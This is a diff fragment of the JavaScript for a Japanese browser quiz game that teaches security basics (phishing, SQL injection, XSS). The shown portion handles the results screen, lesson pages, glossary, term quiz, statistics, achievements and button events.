+    const map = { phishing: "phish_eye", sqli: "sqli_hunter", xss: "xss_hunter", network: "net_guard", logs: "detective" };
+    if (map[M.topic.id]) unlock(map[M.topic.id]);
+  }
+  if (TOPICS.every(t => save.topics[t.id] && save.topics[t.id].plays > 0)) unlock("all_topics");
+  $("btn-next").disabled = false;
+}
+
+function nextMission() {
+  if (run.pos < run.queue.length - 1) { run.pos++; startMission(); }
+  else finishRun();
+}
+
+/* ---------------- 最終結果 ---------------- */
+function finishRun() {
+  const modeName = { story: "ストーリーモード", quick: "クイックプレイ", weak: "苦手克服モード", single: "ステージ選択" }[run.mode];
+  const ratio = run.max ? run.score / run.max : 0;
+  const r = RANKS.find(x => ratio >= x.min);
+  SFX.fanfare();
+  $("f-mode").textContent = `${modeName}（${DIFFS[run.diff].label}）完了`;
+  $("f-rank").textContent = r.rank;
+  $("f-title").textContent = r.title;
+  $("f-score").textContent = `${run.score} / ${run.max} 点`;
+  $("f-msg").textContent = r.msg;
+  $("f-epilogue").textContent = run.mode === "story" ? "EPILOGUE：" + EPILOGUE : "";
+
+  // 実績（プレイ単位）
+  const totalFp = run.results.reduce((s, x) => s + x.fps, 0);
+  const usedHint = run.results.some(x => x.hint);
+  if (run.mode === "story") {
+    unlock("story");
+    if (run.diff === "hard") unlock("story_hard");
+    if (!usedHint) unlock("no_hint");
+  }
+  if ((run.mode === "story" || run.mode === "quick") && r.rank === "S") unlock("rank_s");
+  if (run.results.length >= 5 && totalFp === 0) unlock("no_fp");
+  if (run.mode === "weak") unlock("weak");
+
+  // ベストスコア
+  if (run.mode === "story" || run.mode === "quick") {
+    const key = `${run.mode}_${run.diff}`;
+    if (!save.best[key] || run.score > save.best[key].score) {
+      save.best[key] = { score: run.score, rank: r.rank };
+      persist();
+      toast("ベストスコア更新！");
+    }
+  }
+
+  // 新しい実績
+  const ac = $("f-ach");
+  ac.innerHTML = "";
+  $("f-ach-card").style.display = newAchThisRun.length ? "" : "none";
+  newAchThisRun.forEach(a => ac.appendChild(el("div", `${a.icon} ${a.name} ― ${a.desc}`, "new-ach")));
+
+  // 分野別
+  const cats = {};
+  run.results.forEach(x => {
+    const c = cats[x.topic.cat] || (cats[x.topic.cat] = { hits: 0, total: 0 });
+    c.hits += x.hits; c.total += x.total;
+  });
+  const ct = $("f-cats");
+  ct.innerHTML = "";
+  ct.appendChild(headerRow(["分野", "発見率", "", "判定"]));
+  Object.entries(cats).forEach(([k, c]) => {
+    const rate = c.total ? c.hits / c.total : 0;
+    ct.appendChild(dataRow([CATS[k], pct(rate), barEl(rate), judgeTag(rate)]));
+  });
+
+  const tbl = $("f-table");
+  tbl.innerHTML = "";
+  tbl.appendChild(headerRow(["#", "ミッション", "発見", "クイズ", "点数"]));
+  run.results.forEach((x, i) => {
+    tbl.appendChild(dataRow([String(i + 1), `${x.title}${x.perfect ? " 💎" : ""}`, `${x.hits}/${x.total}`, x.quizOk ? "○" : "×", String(x.gain)]));
+  });
+  show("s-final");
+}
+
+function headerRow(cols) {
+  const tr = el("tr");
+  cols.forEach(c => tr.appendChild(el("th", c)));
+  return tr;
+}
+function dataRow(cols) {
+  const tr = el("tr");
+  cols.forEach(c => {
+    const td = el("td");
+    if (c instanceof Node) td.appendChild(c); else td.textContent = c;
+    tr.appendChild(td);
+  });
+  return tr;
+}
+function barEl(rate) {
+  const b = el("div", null, "bar" + (rate < 0.5 ? " low" : rate < 0.8 ? " mid" : ""));
+  const i = el("i");
+  i.style.width = Math.max(0, Math.min(100, rate * 100)) + "%";
+  b.appendChild(i);
+  return b;
+}
+function judgeTag(rate) {
+  if (rate >= 0.8) return el("span", "得意", "tag good");
+  if (rate >= 0.5) return el("span", "もう少し", "tag mid");
+  return el("span", "苦手", "tag bad");
+}
+
+/* ---------------- ステージ選択 ---------------- */
+function buildSelect() {
+  const grid = $("stage-grid");
+  TOPICS.forEach((t, i) => {
+    const b = el("button");
+    b.append(el("b", `${i + 1}. ${t.name}`), el("small", `${CATS[t.cat]} ／ ${t.variants.length}パターン`));
+    b.addEventListener("click", () => startRun("single", [i]));
+    grid.appendChild(b);
+  });
+}
+
+/* ---------------- 学習テキスト ---------------- */
 function renderLesson(i, container, withPlay) {
-  const L = LESSONS[i];
-  const box = document.createElement("div");
-  box.className = "card lesson";
+  const t = TOPICS[i], L = t.lesson;
+  const box = el("div", null, "card lesson");
   box.id = "lesson-" + i;
-  const add = (tag, text, cls) => {
-    const el = document.createElement(tag);
-    if (cls) el.className = cls;
-    el.textContent = text;
-    box.appendChild(el);
-    return el;
-  };
-  add("div", `第${i + 1}章　MISSION ${i + 1}「${STAGES[i].title}」で登場`, "sub");
-  add("h3", L.term);
-  add("h4", "どんなもの？");
-  add("p", L.what);
-  add("h4", "具体例");
-  add("p", L.exampleLabel);
-  add("div", L.example, "ex");
-  add("h4", "何が危ない？");
-  add("p", L.danger);
-  add("h4", "対策");
-  const ul = document.createElement("ul");
-  L.defense.forEach(d => { const li = document.createElement("li"); li.textContent = d; ul.appendChild(li); });
+  box.dataset.idx = i;
+  box.append(
+    el("div", `第${i + 1}章　${CATS[t.cat]}`, "sub"),
+    el("h3", t.name),
+    el("h4", "どんなもの？"), el("p", L.what),
+    el("h4", "具体例"), el("p", L.exampleLabel), el("div", L.example, "ex"),
+    el("h4", "何が危ない？"), el("p", L.danger),
+    el("h4", "対策")
+  );
+  const ul = el("ul");
+  L.defense.forEach(d => ul.appendChild(el("li", d)));
   box.appendChild(ul);
-  add("div", "💡 " + L.tip, "tip");
+  box.appendChild(el("div", "💡 " + L.tip, "tip"));
+  const exam = el("div", null, "exam");
+  exam.appendChild(el("b", "🎓 試験に出るポイント"));
+  exam.appendChild(el("div", t.examPoint));
+  const dl = el("dl");
+  t.terms.forEach(x => { dl.append(el("dt", x.t), el("dd", x.d)); });
+  exam.appendChild(dl);
+  box.appendChild(exam);
   if (withPlay) {
-    const row = document.createElement("div");
-    row.className = "row";
+    const row = el("div", null, "row");
     row.style.marginTop = "12px";
-    const b = document.createElement("button");
-    b.textContent = `▶ MISSION ${i + 1} に挑戦`;
-    b.addEventListener("click", () => startSingle(i));
+    const b = el("button", `▶ この題材で挑戦`);
+    b.addEventListener("click", () => startRun("single", [i]));
     row.appendChild(b);
     box.appendChild(row);
   }
   container.appendChild(box);
 }
 
-function buildTextScreen() {
+function markLessonRead(i) {
+  if (save.lessonsRead.includes(i)) return;
+  save.lessonsRead.push(i);
+  persist();
+  const a = document.querySelector(`#text-toc a[data-idx="${i}"]`);
+  if (a) a.classList.add("read");
+  if (save.lessonsRead.length >= TOPICS.length) unlock("scholar");
+}
+
+function buildText() {
   const toc = $("text-toc"), body = $("text-body");
-  LESSONS.forEach((L, i) => {
-    const a = document.createElement("a");
+  TOPICS.forEach((t, i) => {
+    const a = el("a", `第${i + 1}章　${t.name}`);
     a.href = "#lesson-" + i;
-    a.textContent = `第${i + 1}章　${L.term}`;
+    a.dataset.idx = i;
+    if (save.lessonsRead.includes(i)) a.classList.add("read");
     a.addEventListener("click", (e) => { e.preventDefault(); $("lesson-" + i).scrollIntoView({ behavior: "smooth" }); });
     toc.appendChild(a);
     renderLesson(i, body, true);
   });
+  // 章の最後まで画面に入ったら「読んだ」とみなす
+  if ("IntersectionObserver" in window) {
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach(en => {
+        if (en.isIntersecting && $("s-text").classList.contains("active")) markLessonRead(Number(en.target.parentElement.dataset.idx));
+      });
+    }, { threshold: 0.5 });
+    body.querySelectorAll(".lesson .exam").forEach(e => io.observe(e));
+  }
 }
 
 function openLessonModal(i) {
@@ -780,256 +2143,180 @@ function openLessonModal(i) {
   renderLesson(i, mb, false);
   mb.firstChild.classList.remove("card");
   $("modal").classList.add("open");
+  markLessonRead(i);
 }
 
-const RANKS = [
-  { min: 0.9, rank: "S", title: "伝説のホワイトハッカー", msg: "完璧に近い診断！あなたがいればこの学校は安心です。" },
-  { min: 0.75, rank: "A", title: "凄腕セキュリティエンジニア", msg: "ほとんどの穴を見抜きました。プロ級です！" },
-  { min: 0.55, rank: "B", title: "一人前のホワイトハッカー", msg: "いい調子！見逃した穴の解説を読み直すとさらに伸びます。" },
-  { min: 0.3, rank: "C", title: "見習いハッカー", msg: "基本はつかめています。もう一度挑戦してみよう！" },
-  { min: -Infinity, rank: "D", title: "セキュリティ研修生", msg: "最初はみんなここから。解説を読んで再挑戦！" },
-];
+/* ---------------- 用語集・用語クイズ ---------------- */
+const ALL_TERMS = [];
+TOPICS.forEach(t => t.terms.forEach(x => { if (!ALL_TERMS.some(y => y.t === x.t)) ALL_TERMS.push({ ...x, topic: t.name }); }));
 
-/* ===================== 状態 ===================== */
-const state = {
-  mode: "full",        // full: 全ステージ / single: 1ステージだけ
-  index: 0,
-  score: 0,
-  marks: new Set(),
-  hintUsed: false,
-  stageScores: [],
-  stageGain: 0,
-};
-
-const $ = (id) => document.getElementById(id);
-
-function show(id) {
-  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
-  $(id).classList.add("active");
-  window.scrollTo(0, 0);
-}
-
-function toast(msg) {
-  const t = $("toast");
-  t.textContent = msg;
-  t.classList.add("show");
-  clearTimeout(toast._t);
-  toast._t = setTimeout(() => t.classList.remove("show"), 1200);
-}
-
-function loadBest() {
-  try { return parseInt(localStorage.getItem("whm-best") || "0", 10) || 0; } catch { return 0; }
-}
-function saveBest(v) {
-  try { localStorage.setItem("whm-best", String(v)); } catch {}
-}
-function maxScore() {
-  return STAGES.reduce((s, st) => s + st.vulns.length * 100 + 50, 0);
-}
-function renderBest() {
-  const b = loadBest();
-  $("best-score").textContent = b > 0 ? `ベストスコア：${b} / ${maxScore()}` : "";
-}
-
-/* ===================== 画面描画 ===================== */
-function renderCode(container, stage, classify) {
-  container.innerHTML = "";
-  stage.lines.forEach((text, i) => {
-    const btn = document.createElement("button");
-    btn.className = "ln";
-    const no = document.createElement("span");
-    no.className = "no";
-    no.textContent = i + 1;
-    const code = document.createElement("span");
-    code.textContent = text || " ";
-    btn.append(no, code);
-    classify(btn, i);
-    container.appendChild(btn);
-  });
-}
-
-function startStage(i) {
-  state.index = i;
-  state.marks = new Set();
-  state.hintUsed = false;
-  const st = STAGES[i];
-  $("hud-stage").textContent = state.mode === "full" ? `${i + 1}/${STAGES.length}` : `${i + 1}（単発）`;
-  $("hud-score").textContent = state.score;
-  $("hud-total").textContent = st.vulns.length;
-  $("hud-marks").textContent = 0;
-  $("hud-type").textContent = st.type;
-  $("g-title").textContent = `MISSION ${i + 1}：${st.title}`;
-  $("g-client").textContent = st.client;
-  $("g-scenario").textContent = st.scenario;
-  $("g-hint").style.display = "none";
-  $("g-hint").textContent = "ヒント：" + st.hint;
-  $("btn-hint").disabled = false;
-  renderCode($("g-code"), st, (btn, idx) => {
-    btn.addEventListener("click", () => {
-      if (state.marks.has(idx)) { state.marks.delete(idx); btn.classList.remove("marked"); }
-      else { state.marks.add(idx); btn.classList.add("marked"); }
-      $("hud-marks").textContent = state.marks.size;
-    });
-  });
-  show("s-game");
-}
-
-function useHint() {
-  if (state.hintUsed) return;
-  state.hintUsed = true;
-  $("g-hint").style.display = "block";
-  $("btn-hint").disabled = true;
-  toast("ヒント使用 -50");
-}
-
-function submit() {
-  const st = STAGES[state.index];
-  if (state.marks.size === 0 && !confirm("1行もマークしていません。このまま提出しますか？")) return;
-  const vulnLines = new Set(st.vulns.map(v => v.line));
-  const neutral = new Set(st.neutral || []);
-  let hits = 0, fps = 0;
-  state.marks.forEach(m => {
-    if (vulnLines.has(m)) hits++;
-    else if (!neutral.has(m)) fps++;
-  });
-  let gain = hits * 100 - fps * 30 - (state.hintUsed ? 50 : 0);
-  state.stageGain = gain;
-  state.score += gain;
-
-  $("r-title").textContent = `MISSION ${state.index + 1} 診断結果：${hits} / ${st.vulns.length} 件発見`;
-  $("r-gain").textContent = (gain >= 0 ? "+" : "") + gain;
-
-  renderCode($("r-code"), st, (btn, idx) => {
-    btn.classList.add("done");
-    if (vulnLines.has(idx)) btn.classList.add(state.marks.has(idx) ? "hit" : "miss");
-    else if (state.marks.has(idx) && !neutral.has(idx)) btn.classList.add("fp");
-    else if (state.marks.has(idx)) btn.classList.add("marked");
-  });
-
-  const list = $("r-list");
+function renderGlossary(filter) {
+  const list = $("gl-list");
   list.innerHTML = "";
-  st.vulns.forEach(v => {
-    const found = state.marks.has(v.line);
-    const div = document.createElement("div");
-    div.className = "result-item " + (found ? "ok" : "ng");
-    const h = document.createElement("h4");
-    h.textContent = `${found ? "✔ 発見" : "✘ 見逃し"}　${v.line + 1}行目：${v.name}`;
-    const p = document.createElement("div");
-    p.textContent = v.why;
-    const fx = document.createElement("div");
-    fx.className = "fix";
-    fx.textContent = "【対策】\n" + v.fix;
-    div.append(h, p, fx);
-    list.appendChild(div);
+  const f = (filter || "").trim().toLowerCase();
+  const items = ALL_TERMS.filter(x => !f || (x.t + x.d + x.topic).toLowerCase().includes(f));
+  if (!items.length) { list.appendChild(el("p", "見つかりませんでした。", "sub")); return; }
+  items.forEach(x => {
+    const d = el("div", null, "gl-item");
+    d.append(el("b", x.t), el("small", x.topic), el("div", x.d));
+    list.appendChild(d);
   });
-  if (fps > 0) {
-    const div = document.createElement("div");
-    div.className = "result-item";
-    div.textContent = `安全な行を ${fps} 行マークしました（-${fps * 30}）。本物の診断でも「誤検知」は相手の時間を奪うので、根拠を持って報告しよう。`;
-    list.appendChild(div);
-  }
-
-  // クイズ
-  $("q-text").textContent = st.quiz.q;
-  $("q-explain").style.display = "none";
-  $("btn-next").disabled = true;
-  $("btn-next").textContent = (state.mode === "full" && state.index < STAGES.length - 1) ? "次のミッションへ" : "結果を見る";
-  const qc = $("q-choices");
-  qc.innerHTML = "";
-  st.quiz.choices.forEach((c, ci) => {
-    const b = document.createElement("button");
-    b.textContent = `${"ABCD"[ci]}. ${c}`;
-    b.addEventListener("click", () => answerQuiz(ci));
-    qc.appendChild(b);
-  });
-  show("s-result");
 }
 
-function answerQuiz(ci) {
-  const st = STAGES[state.index];
-  const btns = $("q-choices").querySelectorAll("button");
-  btns.forEach((b, i) => {
-    b.disabled = true;
-    if (i === st.quiz.answer) b.classList.add("correct");
-    else if (i === ci) b.classList.add("wrong");
+const GQ = { qs: [], pos: 0, ok: 0 };
+function startGQuiz() {
+  GQ.qs = shuffle(ALL_TERMS).slice(0, 10).map(x => {
+    const wrong = shuffle(ALL_TERMS.filter(y => y.t !== x.t)).slice(0, 3).map(y => y.t);
+    const choices = shuffle([x.t, ...wrong]);
+    return { term: x, choices, answer: choices.indexOf(x.t) };
   });
-  const ok = ci === st.quiz.answer;
-  if (ok) { state.score += 50; state.stageGain += 50; toast("正解！ +50"); }
-  else toast("ざんねん…");
-  $("r-gain").textContent = (state.stageGain >= 0 ? "+" : "") + state.stageGain;
-  const ex = $("q-explain");
-  ex.textContent = (ok ? "正解！ " : "不正解。 ") + st.quiz.explain;
-  ex.style.display = "block";
-  state.stageScores[state.index] = state.stageGain;
-  $("btn-next").disabled = false;
+  GQ.pos = 0; GQ.ok = 0;
+  renderGQ();
+  show("s-gquiz");
 }
-
-function next() {
-  if (state.mode === "full" && state.index < STAGES.length - 1) startStage(state.index + 1);
-  else finish();
-}
-
-function finish() {
-  const max = state.mode === "full" ? maxScore() : STAGES[state.index].vulns.length * 100 + 50;
-  const ratio = state.score / max;
-  const r = RANKS.find(x => ratio >= x.min);
-  $("f-rank").textContent = r.rank;
-  $("f-title").textContent = r.title;
-  $("f-score").textContent = `${state.score} / ${max} 点`;
-  $("f-msg").textContent = r.msg + (state.mode === "single" ? "（単発プレイ）" : "");
-  const tbl = $("f-table");
-  tbl.innerHTML = "<tr><th>#</th><th>ミッション</th><th>点数</th></tr>";
-  STAGES.forEach((st, i) => {
-    if (state.stageScores[i] === undefined) return;
-    const tr = document.createElement("tr");
-    [String(i + 1), st.title, String(state.stageScores[i])].forEach(t => {
-      const td = document.createElement("td"); td.textContent = t; tr.appendChild(td);
+function renderGQ() {
+  const q = GQ.qs[GQ.pos];
+  $("gq-progress").textContent = `${GQ.pos + 1} / ${GQ.qs.length}　正解 ${GQ.ok}`;
+  $("gq-def").textContent = q.term.d;
+  $("gq-explain").textContent = "";
+  $("btn-gq-next").disabled = true;
+  $("btn-gq-next").textContent = GQ.pos < GQ.qs.length - 1 ? "次へ" : "結果を見る";
+  const box = $("gq-choices");
+  box.innerHTML = "";
+  q.choices.forEach((c, i) => {
+    const b = el("button", `${"ABCD"[i]}. ${c}`);
+    b.addEventListener("click", () => {
+      box.querySelectorAll("button").forEach((x, j) => {
+        x.disabled = true;
+        if (j === q.answer) x.classList.add("correct");
+        else if (j === i) x.classList.add("wrong");
+      });
+      if (i === q.answer) { GQ.ok++; SFX.good(); } else SFX.bad();
+      $("gq-progress").textContent = `${GQ.pos + 1} / ${GQ.qs.length}　正解 ${GQ.ok}`;
+      $("gq-explain").textContent = `（${q.term.topic}）`;
+      $("btn-gq-next").disabled = false;
     });
-    tbl.appendChild(tr);
+    box.appendChild(b);
   });
-  if (state.mode === "full" && state.score > loadBest()) {
-    saveBest(state.score);
-    toast("ベストスコア更新！");
+}
+function nextGQ() {
+  if (GQ.pos < GQ.qs.length - 1) { GQ.pos++; renderGQ(); return; }
+  SFX.fanfare();
+  if (GQ.ok >= 9) unlock("glossary");
+  alert(`用語クイズ終了！ ${GQ.qs.length}問中 ${GQ.ok}問正解${GQ.ok >= 9 ? "\nすばらしい！" : GQ.ok >= 6 ? "\nいい調子！" : "\n用語集で復習しよう！"}`);
+  show("s-glossary");
+}
+
+/* ---------------- 成績・苦手リスト ---------------- */
+function renderStats() {
+  const has = Object.keys(save.topics).length > 0;
+  $("stats-empty").textContent = has ? "" : "まだ記録がありません。プレイすると、ここに分野別の得意・苦手が表示されます。";
+
+  const cats = {};
+  Object.keys(CATS).forEach(k => cats[k] = { found: 0, total: 0, quizOk: 0, quizN: 0, plays: 0 });
+  TOPICS.forEach(t => {
+    const s = save.topics[t.id];
+    if (!s) return;
+    const c = cats[t.cat];
+    c.found += s.found; c.total += s.total; c.quizOk += s.quizOk; c.quizN += s.quizN; c.plays += s.plays;
+  });
+  const ct = $("stats-cats");
+  ct.innerHTML = "";
+  ct.appendChild(headerRow(["分野", "正解率", "", "判定"]));
+  Object.entries(cats).forEach(([k, c]) => {
+    const r = topicRate(c);
+    ct.appendChild(dataRow([CATS[k], r === null ? "―" : pct(r), r === null ? "未プレイ" : barEl(r), r === null ? "" : judgeTag(r)]));
+  });
+
+  const rows = TOPICS.map((t, i) => ({ t, i, s: save.topics[t.id], r: topicRate(save.topics[t.id]) }));
+  rows.sort((a, b) => (a.r === null ? 2 : a.r) - (b.r === null ? 2 : b.r));
+  const tt = $("stats-topics");
+  tt.innerHTML = "";
+  tt.appendChild(headerRow(["題材", "正解率", "", "回数", ""]));
+  rows.forEach(x => {
+    const b = el("button", "練習");
+    b.style.padding = "4px 10px";
+    b.addEventListener("click", () => startRun("single", [x.i]));
+    tt.appendChild(dataRow([x.t.name, x.r === null ? "―" : pct(x.r), x.r === null ? el("span", "未プレイ", "sub") : barEl(x.r), x.s ? String(x.s.plays) : "0", b]));
+  });
+
+  const missed = [];
+  TOPICS.forEach(t => {
+    const s = save.topics[t.id];
+    if (s) Object.entries(s.missed).forEach(([name, n]) => missed.push({ name, n, topic: t.name }));
+  });
+  missed.sort((a, b) => b.n - a.n);
+  const ml = $("stats-missed");
+  ml.innerHTML = "";
+  if (!missed.length) ml.appendChild(el("p", has ? "見逃しはありません。すばらしい！" : "―", "sub"));
+  else {
+    const ul = el("ul");
+    missed.slice(0, 10).forEach(m => ul.appendChild(el("li", `${m.name}（${m.topic}）… ${m.n}回見逃し`)));
+    ml.appendChild(ul);
   }
-  show("s-final");
 }
 
-function startFull() {
-  state.mode = "full"; state.score = 0; state.stageScores = [];
-  startStage(0);
-}
-function startSingle(i) {
-  state.mode = "single"; state.score = 0; state.stageScores = [];
-  startStage(i);
+/* ---------------- 実績画面 ---------------- */
+function renderAch() {
+  const g = $("ach-grid");
+  g.innerHTML = "";
+  const n = Object.keys(save.achievements).length;
+  $("ach-summary").textContent = `${n} / ${ACHIEVEMENTS.length} 個 解除済み`;
+  ACHIEVEMENTS.forEach(a => {
+    const got = save.achievements[a.id];
+    const d = el("div", null, "ach" + (got ? "" : " locked"));
+    const info = el("div");
+    info.append(el("b", got ? a.name : "？？？"), el("small", a.desc + (got ? `（${got}）` : "")));
+    d.append(el("div", a.icon, "ic"), info);
+    g.appendChild(d);
+  });
 }
 
-/* ===================== イベント ===================== */
-$("btn-start").addEventListener("click", startFull);
-$("btn-retry").addEventListener("click", startFull);
+/* ---------------- イベント ---------------- */
+$("btn-story").addEventListener("click", startStory);
+$("btn-prologue-go").addEventListener("click", () => startRun("story", TOPICS.map((_, i) => i)));
+$("btn-quick").addEventListener("click", startQuick);
+$("btn-weak").addEventListener("click", startWeak);
+$("btn-stats-weak").addEventListener("click", startWeak);
 $("btn-select").addEventListener("click", () => show("s-select"));
-$("btn-back-title").addEventListener("click", () => { renderBest(); show("s-title"); });
-$("btn-to-title").addEventListener("click", () => { renderBest(); show("s-title"); });
-$("btn-hint").addEventListener("click", useHint);
-$("btn-submit").addEventListener("click", submit);
-$("btn-next").addEventListener("click", next);
-
-const grid = $("stage-grid");
-STAGES.forEach((st, i) => {
-  const b = document.createElement("button");
-  b.innerHTML = `<b>MISSION ${i + 1}</b><span></span><small></small>`;
-  b.querySelector("span").textContent = "　" + st.title;
-  b.querySelector("small").textContent = st.type;
-  b.addEventListener("click", () => startSingle(i));
-  grid.appendChild(b);
-});
 $("btn-text").addEventListener("click", () => show("s-text"));
-$("btn-text-back").addEventListener("click", () => { renderBest(); show("s-title"); });
+$("btn-glossary").addEventListener("click", () => { renderGlossary($("gl-search").value); show("s-glossary"); });
+$("gl-search").addEventListener("input", (e) => renderGlossary(e.target.value));
+$("btn-gquiz").addEventListener("click", startGQuiz);
+$("btn-gq-next").addEventListener("click", nextGQ);
+$("btn-gq-quit").addEventListener("click", () => show("s-glossary"));
+$("btn-stats").addEventListener("click", () => { renderStats(); show("s-stats"); });
+$("btn-final-stats").addEventListener("click", () => { renderStats(); show("s-stats"); });
+$("btn-ach").addEventListener("click", () => { renderAch(); show("s-ach"); });
+$("btn-reset").addEventListener("click", () => {
+  if (!confirm("プレイ記録・実績・ベストスコアをすべて消します。よろしいですか？")) return;
+  const keep = { diff: save.diff, sound: save.sound };
+  save = Object.assign(defaultSave(), keep);
+  persist();
+  document.querySelectorAll("#text-toc a").forEach(a => a.classList.remove("read"));
+  renderStats();
+  toast("記録をリセットしました");
+});
+$("btn-sound").addEventListener("click", () => { save.sound = !save.sound; persist(); renderTitle(); SFX.click(); });
+$("btn-hint").addEventListener("click", useHint);
+$("btn-quit").addEventListener("click", () => { if (confirm("ミッションを中断してタイトルに戻りますか？")) goTitle(); });
+$("btn-submit").addEventListener("click", () => submit(false));
+$("btn-next").addEventListener("click", nextMission);
+$("btn-retry").addEventListener("click", () => {
+  if (run.mode === "story") startStory();
+  else if (run.mode === "quick") startQuick();
+  else if (run.mode === "weak") startWeak();
+  else startRun("single", run.queue);
+});
+$("btn-review").addEventListener("click", () => openLessonModal(TOPICS.indexOf(M.topic)));
 $("btn-text-top").addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));
-$("btn-review").addEventListener("click", () => openLessonModal(state.index));
 $("btn-modal-close").addEventListener("click", () => $("modal").classList.remove("open"));
 $("modal").addEventListener("click", (e) => { if (e.target.id === "modal") $("modal").classList.remove("open"); });
-buildTextScreen();
-renderBest();
+document.querySelectorAll("[data-back]").forEach(b => b.addEventListener("click", goTitle));
+
+buildSelect();
+buildText();
+renderTitle();
 </script>
 </body>
 </html>
